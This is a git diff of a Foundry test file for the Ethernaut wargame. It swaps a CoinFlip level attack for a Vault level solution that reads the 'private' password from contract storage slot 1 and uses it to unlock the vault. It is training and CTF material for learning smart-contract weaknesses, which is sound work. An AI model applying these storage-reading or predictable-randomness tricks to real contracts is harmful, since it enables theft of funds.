@@ -3,12 +3,12 @@
 pragma solidity ^0.8.10;
 
 import "ds-test/test.sol";
-import "../CoinFlip/CoinFlipHack.sol";
-import "../CoinFlip/CoinFlipFactory.sol";
+import "../Vault/Vault.sol";
+import "../Vault/VaultFactory.sol";
 import "../Ethernaut.sol";
 import "./utils/vm.sol";
 
-contract CoinFlipTest is DSTest {
+contract VaultTest is DSTest {
     Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
     Ethernaut ethernaut;
 
@@ -17,32 +17,29 @@ contract CoinFlipTest is DSTest {
         ethernaut = new Ethernaut();
     }
 
-    function testCoinFlipHack() public {
+    function testVaultHack() public {
         /////////////////
         // LEVEL SETUP //
         /////////////////
 
-        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();
-        ethernaut.registerLevel(coinFlipFactory);
+        VaultFactory vaultFactory = new VaultFactory();
+        ethernaut.registerLevel(vaultFactory);
         vm.startPrank(tx.origin);
-        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
-        CoinFlip coinFlip = CoinFlip(payable(levelAddress));
+        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
 
         //////////////////
         // LEVEL ATTACK //
         //////////////////
 
-        CoinFlipHack coinFlipHack = new CoinFlipHack();
+        Vault vault = Vault(levelAddress);
 
-        // Move the block from 0 to 5 to prevent underflow errors
-        uint256 starting_block = 5;
-        vm.roll(starting_block);
+        // Use cheats to get the 'private' memory slot, which is always visible
+        bytes32 password = vm.load(levelAddress, bytes32(uint256(1)));
 
-        for (uint i = 0; i <= 10; i++) {
-            vm.roll(starting_block + i);
-            coinFlipHack.attack(address(coinFlip));
-        }
+        emit log_named_bytes32("Vault password:", password);
 
+        vault.unlock(password);
+        
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
